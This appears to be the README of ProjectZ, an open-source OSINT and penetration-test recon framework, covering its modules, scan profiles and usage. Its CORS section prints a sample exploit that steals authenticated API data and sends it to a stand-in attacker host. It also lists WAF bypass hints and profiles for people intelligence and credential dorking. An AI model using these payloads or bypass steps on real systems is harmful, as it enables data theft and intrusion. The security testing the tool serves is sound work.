<p align="center">
  <img src="logo.png.png" width="800"/>
</p>

<div align="center">

```
██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗███████╗
██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝╚════██║
██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║       ██╔╝
██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║      ██╔╝
██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║      ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝      ╚═╝
```


**Open Source Intelligence & Pentest Recon Framework**

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square&logo=python)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![Modules](https://img.shields.io/badge/Modules-55-orange?style=flat-square)](src/modules)
[![Version](https://img.shields.io/badge/Version-1.0-purple?style=flat-square)](#)
[![APIs](https://img.shields.io/badge/Paid%20APIs-Zero-brightgreen?style=flat-square)](#free-api-keys)
[![Async](https://img.shields.io/badge/Engine-Async-cyan?style=flat-square)](#architecture)

> **55 Modules · Zero Paid APIs · Async Engine · WAF Detection · CORS Scanner · Cloud Buckets**
>
> *Developed by* **cyberhowler (R.G)**

</div>

---

## What is ProjectZ?

ProjectZ is a modular, async-powered OSINT and pentest recon framework built for security researchers, red teamers, bug bounty hunters, and penetration testers. It aggregates intelligence from 55+ sources — DNS, WHOIS, breach databases, threat feeds, social networks, search engines, cloud storage, WAF fingerprinting — into a unified SQLite database with full HTML/JSON/CSV report export.

- **55+ modules** covering domain, people, network, dorking, harvesting, cybersec, and web security
- **Zero paid APIs required** — everything works out of the box, optional keys boost results
- **Async engine** — runs all modules concurrently, 10x faster than sequential tools
- **15 random wolf banners** on every launch (Metasploit style)
- **Correlation engine** — cross-references all findings post-scan, produces 0–100 risk score
- **Watch mode** — re-scans every N hours, shows diff of changes
- **14 built-in scan profiles** — `quick`, `pentest`, `red_team`, `bug_bounty`, `passive_recon`, `web_audit` and more
- **WAF detection** — fingerprints Cloudflare, Imperva, Akamai, F5, ModSecurity + bypass hints
- **CORS scanner** — 10 bypass techniques + JavaScript PoC exploit generation
- **Security headers audit** — OWASP grade A+–F scoring
- **Cloud bucket finder** — AWS S3, GCS, Azure Blob, DigitalOcean Spaces

---
<p align="center">
  <a href="https://cyberhowler.github.io/projectZ/">
    <img src="https://img.shields.io/badge/🌐 Live Demo-GitHub Pages-gold?style=for-the-badge"/>
  </a>
</p>

## Installation

```bash
# 0. create a enviroment
python3 -m venv venv
source venv/bin/activate

# 1. Clone
git clone https://github.com/cyberhowler/projectZ.git
cd projectZ

# 2. One-command install (recommended)
bash install.sh

# OR manual install
pip install -r requirements.txt
cp .env.example .env

# 3. Run preflight check
python3 projectz.py --preflight

# 4. Launch
python3 projectz.py example.com quick
```

---

---

## 📖 Full Command Reference

> 🐺 Click below to view all 55+ commands

[![View All Commands](https://img.shields.io/badge/📖%20View%20All%20Commands-Wiki-blue?style=for-the-badge)](https://github.com/cyberhowler/projectZ/wiki/ProjectZ-All-core-Commands)

## Usage

```
python3 projectz.py --commands   (full command list)
python3 projectz.py <target> <module>           # run single module
python3 projectz.py <target> quick              # 9-module fast scan
python3 projectz.py <target> full               # all 55 modules
python3 projectz.py <target> --profile pentest  # named profile
python3 projectz.py <target> quick --watch 6    # re-scan every 6h
python3 projectz.py --compare <target>          # diff last 2 scans
python3 projectz.py modules                     # full module guide
python3 projectz.py --list-profiles             # show all profiles
python3 projectz.py --db-stats                  # database stats
python3 projectz.py --preflight                 # check API keys
```

### Targets

| Type       | Example                           |
|------------|-----------------------------------|
| Domain     | `example.com`                     |
| IP Address | `8.8.8.8`                         |
| Email      | `admin@example.com`               |
| Username   | `@handle` or `handle`             |
| File Hash  | `d41d8cd98f00b204e9800998ecf8427e`|
| URL        | `https://example.com/page`        |

---

## Scan Profiles

| Profile | Modules | Description |
|---------|---------|-------------|
| `quick` | 9 | Fast recon + WAF + headers, no API keys needed |
| `full` | 55 | All modules |
| `pentest` | 28 | Full recon + vuln hints |
| `red_team` | 38 | Complete red team pre-engagement surface mapping |
| `bug_bounty` | 22 | Subdomain takeover, CORS, open buckets, misconfigs |
| `passive_recon` | 20 | 100% passive — no direct target contact (OPSEC-safe) |
| `web_audit` | 14 | Web security: headers, CORS, WAF, CMS, admin panels |
| `social_eng` | 12 | People intel, emails, breaches, social profiles |
| `domain` | 11 | Domain intelligence + web security |
| `osint` | 9 | People + social + breach checks |
| `threat_intel` | 9 | Cybersec + threat intelligence feeds |
| `quick_ip` | 6 | Fast IP intelligence |
| `recon` | 10 | Classic domain + people + harvesting |

```bash
python3 projectz.py tesla.com --profile red_team
python3 projectz.py tesla.com --profile bug_bounty -f html
python3 projectz.py 1.2.3.4  --profile quick_ip
python3 projectz.py target.com --profile passive_recon  # OPSEC safe
python3 projectz.py target.com --profile web_audit
```

---

## Module Map

| Group | Count | Key Modules |
|-------|-------|-------------|
| `domain` | 12 | whois, dns, subdomains, ssl, tech, asn, hosting, reverseip, spfdmarc, **headers**, **cors**, **cms** |
| `people` | 8 | emails, phones, linkedin, twitter, github, usernames, breach, employees |
| `network` | 9 | portscan, masscan, geo, iprep, shodan, censys, zoomeye, banner, **waf** |
| `dorking` | 6 | google, bing, files, admin, errors, creds |
| `harvesting` | 8 | crtsh, dnsdump, leaks, histdns, hunter, securitytrails, google_harvest, **s3buckets** |
| `cybersec` | 12 | virustotal, urlscan, hibp, otx, abuseipdb, urlhaus, exploitdb, pastebin, intelx, yara... |

```bash
# Run a full group
python3 projectz.py target.com domain.all
python3 projectz.py target.com network.all
python3 projectz.py target.com cybersec.all

# Run new security modules
python3 projectz.py target.com waf         # WAF/CDN detection + bypass hints
python3 projectz.py target.com headers     # Security headers audit (grade A–F)
python3 projectz.py target.com cors        # CORS scan + PoC exploit generation
python3 projectz.py target.com cms         # CMS/framework fingerprinting
python3 projectz.py target.com s3buckets   # Cloud storage bucket finder

# Run individual modules
python3 projectz.py target.com whois
python3 projectz.py target.com dns,ssl,subdomains,waf,headers,cors

# See the full guide
python3 projectz.py modules
python3 projectz.py modules network
python3 projectz.py modules cybersec.virustotal
```

---

## New in v1.0 — Web Attack Surface Modules

### WAF Detection (`waf`)
Fingerprints 15+ Web Application Firewalls and CDNs with 4 detection vectors:
- Response headers (CF-RAY, X-Sucuri-ID, X-Iinfo, etc.)
- Session cookies (incap_ses, __cfduid, bigipserver, etc.)
- Body signatures on normal + crafted payloads
- DNS CNAME chain (*.cloudflare.com, *.akamai.net, etc.)

Provides per-WAF bypass hints for red team engagements:
```
WAF: Cloudflare (94% confidence)
Bypass hints:
  → Find origin IP via Shodan/Censys historical SSL certs
  → Use IPv6 — many CF origins expose IPv6 directly
  → Look for subdomains with CF disabled (mail., ftp., dev.)
  → Try crimeflare.com / leakix.net for origin IP history
```

### Headers Audit (`headers`)
OWASP-aligned security headers check with grade scoring:
```
Grade: C (52%)
Missing [HIGH]:   Content-Security-Policy
Missing [HIGH]:   Strict-Transport-Security
Missing [MED]:    X-Frame-Options
Info Disclosure:  Server: Apache/2.4.41 (Ubuntu)
Cookie Issue:     session_id — Missing Secure flag
```

### CORS Scanner (`cors`)
Tests 10 bypass techniques, generates PoC JavaScript:
```javascript
// CORS PoC — Origin reflected + credentials=true (CRITICAL)
fetch("https://target.com/api/user", {
  credentials: 'include',
})
.then(r => r.text())
.then(data => {
  new Image().src = "https://attacker.com/steal?data=" + btoa(data);
});
```

### CMS Detection (`cms`)
Identifies platform, version, and checks sensitive paths:
```
CMS: WordPress 6.4.3 (99% confidence)
Vuln paths found:
  [HIGH] /.git/config — accessible
  [MED]  /wp-content/debug.log — accessible
  [MED]  /xmlrpc.php — accessible (brute-force target)
```

### Cloud Bucket Finder (`s3buckets`)
Generates 60+ name permutations, probes all major cloud providers:
```
[CRITICAL] AWS S3 bucket WRITABLE: target-backup.s3.amazonaws.com
[HIGH]     GCS bucket PUBLIC-READ: target-assets.storage.googleapis.com
           Files: user-data.csv, exports/2024-Q4.xlsx, config.json...
```

---

## Output Formats

```bash
python3 projectz.py target.com full -f json    # machine readable (default)
python3 projectz.py target.com full -f html    # full HTML report
python3 projectz.py target.com full -f csv     # spreadsheet
python3 projectz.py target.com full -f txt     # plain text

# Specify output file
python3 projectz.py target.com full -f html -o report.html
```

All results are also saved to `data/db/projectz.db` (SQLite).

---

## Advanced Features

### Correlation Engine
After every scan, ProjectZ cross-references all findings and produces a risk score:
```
  Verdict   : HIGH RISK
  Risk Score: 72/100
  Alerts    : 6

  [CRITICAL] Multi-source threat confirmation (VT + OTX + AbuseIPDB)
  [CRITICAL] Public-write S3 bucket exposed
  [HIGH]     CORS misconfiguration with credentials=true
  [HIGH]     Dangerous port exposed: 3389/tcp (RDP)
  [MEDIUM]   Missing security headers — grade D
  [MEDIUM]   WordPress xmlrpc.php accessible
```

### Watch Mode — continuous monitoring
```bash
python3 projectz.py target.com quick --watch 6    # re-scan every 6 hours
# Shows diff: + NEW subdomains, - GONE ports, ! NEW findings
```

### Compare Mode
```bash
python3 projectz.py --compare target.com
```

### Webhook Notifications
```env
SLACK_WEBHOOK=https://hooks.slack.com/services/...
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
NOTIFY_SEVERITY=critical,high
```

### Save custom profiles
```bash
python3 projectz.py target.com waf,cors,headers,cms,admin --save-profile web_pentest
python3 projectz.py target.com --profile web_pentest
```

---

## Architecture

```
projectZ/
├── projectz.py              ← Entry point
├── install.sh               ← One-command installer
├── .env.example             ← API key template (35+ keys)
├── requirements.txt         ← All dependencies
├── src/
│   ├── core/
│   │   ├── engine.py        ← Async orchestrator + BaseModule
│   │   ├── cli.py           ← Click CLI (all commands)
│   │   ├── storage.py       ← SQLite + cache + results
│   │   ├── output.py        ← JSON/HTML/CSV/TXT export
│   │   ├── banners.py       ← 15 random wolf banners
│   │   ├── correlator.py    ← Cross-module risk scoring
│   │   ├── notifier.py      ← Slack/Discord webhooks
│   │   ├── profiles.py      ← 14 scan profiles
│   │   ├── http_client.py   ← Retry + UA rotation + proxy
│   │   ├── rate_limiter.py  ← Token bucket anti-ban
│   │   ├── config.py        ← .env typed settings
│   │   └── logger.py        ← Rotating structured logs
│   └── modules/
│       ├── domain/          ← 12 modules (+ headers, cors, cms)
│       ├── people/          ← 8 modules
│       ├── network/         ← 9 modules (+ waf)
│       ├── dorking/         ← 6 modules
│       ├── harvesting/      ← 8 modules (+ s3buckets)
│       └── cybersec/        ← 12 modules
└── data/
    ├── db/                  ← projectz.db  (SQLite)
    ├── results/             ← Scan outputs
    ├── logs/                ← Rotating logs
    └── cache/               ← 24h TTL cache
```

---

## Free API Keys

All optional. Results improve significantly with keys.

| Service | Free Tier | Get Key |
|---------|-----------|---------|
| VirusTotal | 500 req/day | [virustotal.com](https://virustotal.com) |
| AlienVault OTX | Unlimited | [otx.alienvault.com](https://otx.alienvault.com) |
| AbuseIPDB | 1,000/day | [abuseipdb.com](https://www.abuseipdb.com/register) |
| URLScan.io | 5,000/month | [urlscan.io](https://urlscan.io) |
| GitHub Token | 5,000 req/hr | [github.com/settings/tokens](https://github.com/settings/tokens) |
| Shodan | Limited free | [shodan.io](https://account.shodan.io/register) |
| Censys | 250/month | [censys.io](https://censys.io/register) |
| ZoomEye | 10k/month | [zoomeye.org](https://www.zoomeye.org) |
| HIBP | Domain free | [haveibeenpwned.com](https://haveibeenpwned.com/API/Key) |
| Intelligence X | Limited free | [intelx.io](https://intelx.io) |

---

## Requirements

- Python **3.10+**
- `bash install.sh` handles everything automatically
- Optional system tools: `nmap`, `masscan` (fallback scanners built-in)

---

## Legal Disclaimer

> ProjectZ is intended for **authorized security research, penetration testing, and educational purposes only.**
> Always ensure you have **explicit written permission** before scanning any target.
> The author takes no responsibility for misuse. Use responsibly and ethically.

---

## License

MIT License — See [LICENSE](LICENSE)

---

<div align="center">

**Made with ❤️ by cyberhowler (R.G)**

*"Hunt in silence. Strike in data"*

</div>
